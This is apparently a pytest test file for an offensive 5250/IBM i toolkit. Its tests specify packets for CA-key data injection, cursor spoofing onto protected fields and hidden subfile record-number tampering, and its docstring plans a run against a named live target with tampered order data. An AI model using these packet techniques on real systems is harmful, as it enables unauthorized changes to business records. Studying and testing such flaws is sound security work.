"""
B1 — CA-AID + field-data injection.

The 5250 datastream lets you put SBA+data with ANY AID byte. Only the
emulator enforces "CA = no data". The proxy doesn't have to.

RPG branching on *INKx for a CA key assumes the input buffer is
unchanged. EXFMT deposits whatever's there into program variables.
Programs skip re-validation on CA paths:

  EXFMT SCREEN1
  SELECT
    WHEN *IN03         // F3 = CA03 = "no data sent"
      LEAVE            // exit without re-checking — but we sent data
  ENDSL

Live target (Mels Cargo): F3="Quit" is almost certainly CA03. Send it
with tampered Order=Y data, see if the order persists.
"""
import pytest
from hack5250.constants import AID_TABLE, HDR_LEN, ORD_SBA


@pytest.fixture
def injector():
    from hack5250.attacks.ca_key import CAKeyInjector
    from hack5250.tn5250 import TN5250
    return CAKeyInjector(TN5250())


# === classify_keys_from_screen ===

def test_classify_f3_as_ca_by_convention(injector):
    """F3=Exit is conventionally CA03 across the IBM i ecosystem."""
    s = pytest.mk_screen([])
    result = injector.classify_keys_from_screen(s)
    assert result.get("F3") == "CA"


def test_classify_f12_as_ca_by_convention(injector):
    """F12=Cancel is conventionally CA12."""
    s = pytest.mk_screen([])
    result = injector.classify_keys_from_screen(s)
    assert result.get("F12") == "CA"


def test_classify_f1_as_ca_by_convention(injector):
    """F1=Help is conventionally CA01."""
    s = pytest.mk_screen([])
    result = injector.classify_keys_from_screen(s)
    assert result.get("F1") == "CA"


def test_classify_other_keys_unknown(injector):
    """F4-F11 etc. have no convention — unknown until probed."""
    s = pytest.mk_screen([])
    result = injector.classify_keys_from_screen(s)
    assert result.get("F5") == "unknown"
    assert result.get("F10") == "unknown"


# === send_ca_with_data — THE ATTACK ===

def test_send_ca_with_data_uses_ca_aid(injector):
    """The packet has the F3 AID byte (0x33) at HDR_LEN+2."""
    pkt = injector.send_ca_with_data("F3", [(5, 10, "TAMPER")], cursor=(5, 10))
    assert pkt[HDR_LEN + 2] == AID_TABLE["F3"]  # 0x33


def test_send_ca_with_data_includes_sba(injector):
    """The 'impossible' part: SBA+data follows the CA AID.

    A real emulator would send F3 with NO body (CA = no transmit).
    We send F3 WITH body. This is the packet shape that doesn't exist
    in nature."""
    pkt = injector.send_ca_with_data("F3", [(5, 10, "X")], cursor=(5, 10))
    body = pkt[HDR_LEN:-2]
    # body: cursor_row(1) cursor_col(1) AID(1) SBA(1) row(1) col(1) data(...)
    assert body[3] == ORD_SBA
    assert body[4] == 5    # row
    assert body[5] == 10   # col
    assert body[6] == 0xE7  # 'X' EBCDIC


def test_send_ca_with_data_multiple_fields(injector):
    """Multiple SBA pairs — combined CA-skip + protected-field tamper."""
    pkt = injector.send_ca_with_data(
        "F12",
        [(20, 19, "Y"), (5, 20, "99999")],  # Mels Cargo shape
        cursor=(20, 19),
    )
    body = pkt[HDR_LEN:-2]
    # Two SBA blocks. Walk past cursor(2)+aid(1):
    pos = 3
    sba_count = 0
    while pos < len(body):
        if body[pos] == ORD_SBA:
            sba_count += 1
            pos += 3
            while pos < len(body) and body[pos] != ORD_SBA:
                pos += 1
        else:
            break
    assert sba_count == 2


def test_send_ca_with_data_cursor_in_packet(injector):
    """5250 inbound: cursor BEFORE aid (HDR_LEN+0, HDR_LEN+1)."""
    pkt = injector.send_ca_with_data("F3", [(1, 1, "A")], cursor=(7, 30))
    assert pkt[HDR_LEN + 0] == 7
    assert pkt[HDR_LEN + 1] == 30


def test_send_ca_with_data_unknown_aid_raises(injector):
    """Bad key name → KeyError, don't build a garbage packet."""
    with pytest.raises(KeyError):
        injector.send_ca_with_data("NOTAKEY", [(1, 1, "X")], cursor=(1, 1))


# === probe_ca_validation_skip — diff-based confirmation ===

def test_probe_classifies_validation_error_as_cf(injector, fake_daemon):
    """If we send invalid data with a CA AID and get a validation error
    back → either the key was actually CF, or the program re-validates.
    Either way: NOT a CA-skip vulnerability."""
    # Drive: send → daemon captures → fire response with CPD0078
    s_err = pytest.mk_screen([], header_text="CPD0078 ")
    result = injector.probe_ca_validation_skip(
        fake_daemon, "F3", "INVALID!!", target_field=(5, 10),
        _response_screen=s_err,  # test injection
    )
    assert result["classification"] == "CF_OR_REVALIDATES"
    assert "CPD0078" in result["evidence"]


# ===========================================================================
# B2 — RTNCSRLOC cursor spoofing
# ===========================================================================

def test_build_field_position_map():
    """(row, col) → field index. For 'which field is at this position'."""
    from hack5250.attacks.ca_key import build_field_position_map
    s = pytest.mk_screen([
        pytest.mk_field(5, 10, 8),
        pytest.mk_field(7, 20, 4),
        pytest.mk_field(9, 1, 12),
    ])
    pos_map = build_field_position_map(s)
    assert pos_map[(5, 10)] == 0
    assert pos_map[(7, 20)] == 1
    assert pos_map[(9, 1)] == 2


def test_build_field_position_map_empty_screen():
    from hack5250.attacks.ca_key import build_field_position_map
    s = pytest.mk_screen([])
    assert build_field_position_map(s) == {}


def test_spoof_cursor_to_field_aid_only():
    """The packet has cursor at the target field, AID, NO SBA blocks.

    AID-only — just the cursor lie. The workstation manager will report
    the target field's DDS name to the program."""
    from hack5250.attacks.ca_key import spoof_cursor_to_field
    from hack5250.tn5250 import TN5250
    proto = TN5250()
    s = pytest.mk_screen([
        pytest.mk_field(5, 10, 8),
        pytest.mk_field(7, 20, 4, protected=True),  # ← target
    ])
    pkt = spoof_cursor_to_field(proto, s, target_field_idx=1)
    body = pkt[HDR_LEN:-2]
    assert body[0] == 7    # cursor row = field 1's row
    assert body[1] == 20   # cursor col = field 1's col
    assert body[2] == AID_TABLE["ENTER"]
    assert len(body) == 3  # ONLY cursor + aid, no SBA


def test_spoof_cursor_aid_override():
    """Custom AID — cursor lie + F-key in one packet."""
    from hack5250.attacks.ca_key import spoof_cursor_to_field
    from hack5250.tn5250 import TN5250
    proto = TN5250()
    s = pytest.mk_screen([pytest.mk_field(3, 5, 6)])
    pkt = spoof_cursor_to_field(proto, s, target_field_idx=0, aid="F4")
    assert pkt[HDR_LEN + 2] == AID_TABLE["F4"]


def test_spoof_cursor_out_of_range_raises():
    from hack5250.attacks.ca_key import spoof_cursor_to_field
    from hack5250.tn5250 import TN5250
    proto = TN5250()
    s = pytest.mk_screen([pytest.mk_field(1, 1, 4)])
    with pytest.raises(IndexError):
        spoof_cursor_to_field(proto, s, target_field_idx=5)


# ===========================================================================
# B3 — Subfile RRN tampering
# ===========================================================================

def _zoned(n: int, width: int = 4) -> bytes:
    """4-digit zoned decimal. 5 → b'\\xf0\\xf0\\xf0\\xf5'."""
    return bytes(0xF0 + int(d) for d in str(n).zfill(width))


@pytest.fixture
def subfile_screen_pair():
    """Two screens: before and after ROLLUP. RRN at field idx 1.

    Field 0: visible option column (input, length 1)
    Field 1: HIDDEN RRN — 4 zoned digits, increments on roll  ← detector target
    Field 2: visible item description (protected, length 20)
    """
    before = pytest.mk_screen([
        pytest.mk_field(8, 2, 1, protected=False),                       # option
        pytest.mk_field(8, 70, 4, hidden=True, content=_zoned(5)),       # RRN=0005
        pytest.mk_field(8, 5, 20, protected=True, content=b"\xc1" * 20), # desc
    ])
    after = pytest.mk_screen([
        pytest.mk_field(8, 2, 1, protected=False),
        pytest.mk_field(8, 70, 4, hidden=True, content=_zoned(6)),       # RRN=0006 — INCREMENTED
        pytest.mk_field(8, 5, 20, protected=True, content=b"\xc2" * 20),
    ])
    return before, after


def test_detect_rrn_finds_incremented_hidden_zoned(subfile_screen_pair):
    """The hidden 4-zoned field that incremented after ROLLUP is the RRN."""
    from hack5250.attacks.ca_key import SubfileRRNTamperer
    before, after = subfile_screen_pair
    t = SubfileRRNTamperer()
    idx = t.detect_rrn_field(before, after)
    assert idx == 1


def test_detect_rrn_ignores_visible_fields(subfile_screen_pair):
    """Make field 2 ALSO increment — but it's visible, so not RRN."""
    from hack5250.attacks.ca_key import SubfileRRNTamperer
    before, after = subfile_screen_pair
    # Make the visible description field also look like incrementing zoned
    before.fields[2] = pytest.mk_field(8, 5, 4, protected=True, hidden=False,
                                       content=_zoned(10))
    after.fields[2] = pytest.mk_field(8, 5, 4, protected=True, hidden=False,
                                      content=_zoned(11))
    t = SubfileRRNTamperer()
    idx = t.detect_rrn_field(before, after)
    assert idx == 1  # still field 1 — field 2 is visible


def test_detect_rrn_returns_none_when_no_candidate():
    """No hidden zoned-incrementing field → None."""
    from hack5250.attacks.ca_key import SubfileRRNTamperer
    before = pytest.mk_screen([pytest.mk_field(1, 1, 8, content=b"\xc1" * 8)])
    after = pytest.mk_screen([pytest.mk_field(1, 1, 8, content=b"\xc2" * 8)])
    t = SubfileRRNTamperer()
    assert t.detect_rrn_field(before, after) is None


def test_detect_rrn_ignores_non_zoned_hidden():
    """Hidden field with non-F0-F9 bytes is not RRN."""
    from hack5250.attacks.ca_key import SubfileRRNTamperer
    before = pytest.mk_screen([
        pytest.mk_field(1, 1, 4, hidden=True, content=b"\xc1\xc2\xc3\xc4"),
    ])
    after = pytest.mk_screen([
        pytest.mk_field(1, 1, 4, hidden=True, content=b"\xc5\xc6\xc7\xc8"),
    ])
    t = SubfileRRNTamperer()
    assert t.detect_rrn_field(before, after) is None


def test_tamper_rrn_builds_two_sba_packet():
    """Option=4 at the visible row + RRN=9999 at the hidden field.
    Multi-SBA: host applies option 4 to record 9999 instead of what
    the operator sees."""
    from hack5250.attacks.ca_key import SubfileRRNTamperer
    from hack5250.tn5250 import TN5250
    t = SubfileRRNTamperer()
    pkt = t.tamper_rrn(
        TN5250(),
        rrn_field=(8, 70), option_field=(8, 2),
        option_value="4", target_rrn=9999,
    )
    body = pkt[HDR_LEN:-2]
    # cursor at option field
    assert body[0] == 8
    assert body[1] == 2
    # First SBA: option field, value '4' = 0xF4
    assert body[3] == ORD_SBA
    assert body[4] == 8 and body[5] == 2
    assert body[6] == 0xF4
    # Second SBA: RRN field, value '9999' zoned = F9 F9 F9 F9
    assert body[7] == ORD_SBA
    assert body[8] == 8 and body[9] == 70
    assert body[10:14] == b"\xf9\xf9\xf9\xf9"

